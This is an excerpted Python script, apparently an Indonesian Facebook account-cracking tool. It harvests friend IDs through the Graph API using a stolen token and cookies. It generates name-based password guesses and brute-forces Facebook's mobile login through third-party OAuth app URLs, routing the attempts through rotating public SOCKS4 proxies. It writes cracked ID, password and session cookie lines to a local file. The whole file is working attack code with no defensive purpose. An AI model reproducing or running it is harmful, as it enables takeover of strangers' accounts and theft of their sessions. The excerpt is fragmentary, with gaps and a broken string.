...
def menu(aink_saha,aink_cyxieon_xr):
	...
	if __gas_mas_bro__ in ["1"]:
		...
		for userr in uid:
			try:
			    _grapt_facebook_idz_ = ses.get('https://graph.facebook.com/v2.5/'+userr+'?fields=friends.limit(5000)&access_token='+tokenefacebook[0], cookies = {'cookies':cok}).json()
...
def atur_metode():
	...
	__arf_x_ganteng__(f'{k}└──[{x} 03. Asyinc2 ')
	__arf_x_ganteng__(f"{k}╭────────────────────────────────────────────")
	...
	elif __metode_krek_idz__ in ['3','03']:
		method.append('asyinc2')
	else:
		method.append('validate')	
	wordlistxnx()	
			...
			for vanilla in id2:
				...
				if len(namamu_kusimpan)<6:
					if len(aink_tersakiti)<3:
						...
						muhammad_arif_xr.append('Pekalongan');muhammad_arif_xr.append(aink_tersakiti+'123');muhammad_arif_xr.append(aink_tersakiti+'1234');muhammad_arif_xr.append(aink_tersakiti+'12345');muhammad_arif_xr.append(aink_tersakiti+'321')
				else:
					if len(aink_tersakiti)<3:
				...
				elif "asyinc2" in method:
				    sorry_bang_gabutz_ribet_sc_nya.submit(crackasyinc2,idf,muhammad_arif_xr,"m.facebook.com")
				else:
				    sorry_bang_gabutz_ribet_sc_nya.submit(crackvalidate,idf,muhammad_arif_xr,"m.facebook.com")
				    __arf_x_ganteng__(f"\n{k}╭────────────────────────────────────────────{x}")
...
def crackvalidate(idf,muhammad_arif_xr,url):
	...
	ses = requests.Session()
	rr = random.randint
	prog.update(des,description=f"{x} Validate {loop}/{len(id)} {h}OK : {ok} {k}CP : {cp}{x} ")
	prog.advance(des)
	for pw in muhammad_arif_xr:
		try:
			...
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=965240837599503&kid_directed_site=0&app_id=965240837599503&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D965240837599503%26redirect_uri%3Dhttps%253A%252F%252Fauth.crazygames.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDlR-24bGPb0ul22jakRsLtvTl5rpX9PgKWnOFW30P4sY-pEOeRleKMZ_1utSOh2slXqJBSpA51-9oftRQEEmyexxxqRAbcoKDHWXRviu9VQ4X9ODse0_tdVW5zcwmAC0NorSnTIvBXVFcl9Gh_I1TfzTMBwA03NZ_WHz2YVCfQEGt_alw-mSiVpz0wXfncrNup52OF0-YwHAvvEVNgK0PVF1zKqKV0ttr8FOn-URIfuYbpoq1P_5OYvJ4BCrglDzftyzx0ovfxmIUroDnHpIboa2gjoUaq2PQNedi8usfyl3asKvloyI3FjD3gMrDr0ioTT%26scope%3Dpublic_profile%252Cemail%26context_uri%3Dhttps%253A%252F%252Fwww.crazygames.co.id%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2afa50fb-71ba-4243-8da2-3096d8f651a0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.crazygames.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3
23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br',
'accept-language': version}
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				XiaoYan = Tree("")
				XiaoYan.add(f"\r{h}{idf}|{pw}{x}").add(f"{h}{kuki}{x}")
				XiaoYan.add(f"{m}{ua}{x}")
				prints(XiaoYan)
...
def crackasyinc(idf,muhammad_arif_xr,url):
	...
	ses = requests.Session()
	rr = random.randint
	prog.update(des,description=f"{x}{idf} {loop}/{len(id)} {h}LIVE : {ok} {k}CP : {cp}{x} ")
	prog.advance(des)
	for pw in muhammad_arif_xr:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			...
			nip=random.choice(proxs)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=381492882293425&kid_directed_site=0&app_id=381492882293425&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D381492882293425%26scope%3Dpublic_profile%2Bemail%26state%3DBdOflNWywjqMCUYM2pRS_wWY3ym4yqc8-KasqAXJErM%253D%26redirect_uri%3Dhttps%253A%252F%252Fapi-studio.zepeto.me%252Flogin%252Foauth2%252Fcode%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D3feb778a-1628-4781-a6b7-e4e7339213b5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi-studio.zepeto.me%2Flogin%2Foauth2%2Fcode%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DBdOflNWywjqMCUYM2pRS_wWY3ym4yqc8-KasqAXJErM%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
...
"accept-language": version}
			po = ses.post(f"https://{url}/login/device-based/login/async/?api_key=381492882293425&auth_token=928c50e7a0d7d13e5195ccb124181bc5&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D381492882293425%26scope%3Dpublic_profile%2Bemail%26state%3D5BctAC_Qm_YtJSsASMw6vmNuolR0SmNS6-kFj_hw1VM%253D%26redirect_uri%3Dhttps%253A%252F%252Fapi-studio.zepeto.me%252Flogin%252Foauth2%252Fcode%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D892a6afe-18d3-4137-984e-a93ef14aff1b%26tp%3Dunspecified&refsrc=deprecated&app_id=381492882293425&cancel=https%3A%2F%2Fapi-studio.zepeto.me%2Flogin%2Foauth2%2Fcode%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D5BctAC_Qm_YtJSsASMw6vmNuolR0SmNS6-kFj_hw1VM%253D%23_%3D_&lwv=100", headers=head, data=date, allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				XiaoYan = Tree("")
				XiaoYan.add(f"{k}{idf}|{pw}{x}")
				XiaoYan.add(f"{m}{ua}{x}")
				...
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				XiaoYan = Tree("")
				XiaoYan.add(f"\r{h}{idf}|{pw}{x}")
				XiaoYan.add(f"{h}{kuki}{x}")
				prints(XiaoYan)
				open('/sdcard/CYXIEON-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break				
...
def crackasyinc2(idf,muhammad_arif_xr,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	prog.update(des,description=f"{x}New Studio {loop}/{len(id)} {h}LIVE : {ok} {k}CP : {cp}{x} ")
	prog.advance(des)
	for pw in muhammad_arif_xr:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			...
			nip=random.choice(proxs)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=526799638016089&kid_directed_site=0&app_id=526799638016089&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D526799638016089%26redirect_uri%3Dhttps%253A%252F%252Ftalkstudio.streamlabs.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DkFAbcIX2XIr0TbZcalOjlBfQVC62yVvdX4f1Losn%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3e144cc-f36c-46b1-bccf-1bcbc1a8cc50%26tp%3Dunspecified&cancel_url=https%3A%2F%2Ftalkstudio.streamlabs.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DkFAbcIX2XIr0TbZcalOjlBfQVC62yVvdX4f1Losn%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': '0',
'unrecognized_tries': '0',
...
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": f"https://{url}/login.php?skip_api_login=1&api_key=526799638016089&kid_directed_site=0&app_id=526799638016089&signed_next=1&next=https://m.facebook.com/v3.3/dialog/oauth?client_id=526799638016089&redirect_uri=https%3A%2F%2Ftalkstudio.streamlabs.com%2Fauth%2Ffacebook%2Fcallback&scope=email&response_type=code&state=kFAbcIX2XIr0TbZcalOjlBfQVC62yVvdX4f1Losn&ret=login&fbapp_pres=0&logger_id=a3e144cc-f36c-46b1-bccf-1bcbc1a8cc50&tp=unspecified&cancel_url=https://talkstudio.streamlabs.com/auth/facebook/callback?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=kFAbcIX2XIr0TbZcalOjlBfQVC62yVvdX4f1Losn#_=_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
"accept-encoding": "gzip, deflate, br",
"sec-websocket-version": str(rr(5,13)),
"accept-language": version}
			po = ses.post(f"https://{url}/login/device-based/login/async/?api_key=526799638016089&auth_token=02a32e93bea37539efe6c77a2d17400f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D526799638016089%26redirect_uri%3Dhttps%253A%252F%252Ftalkstudio.streamlabs.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DkFAbcIX2XIr0TbZcalOjlBfQVC62yVvdX4f1Losn%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3e144cc-f36c-46b1-bccf-1bcbc1a8cc50%26tp%3Dunspecified&refsrc=deprecated&app_id=526799638016089&cancel=https%3A%2F%2Ftalkstudio.streamlabs.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DkFAbcIX2XIr0TbZcalOjlBfQVC62yVvdX4f1Losn%23_%3D_&lwv=100", headers=head, data=date, allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				XiaoYan = Tree("")
				XiaoYan.add(f"{k}{idf}|{pw}{x}")
				XiaoYan.add(f"{m}{ua}{x}")
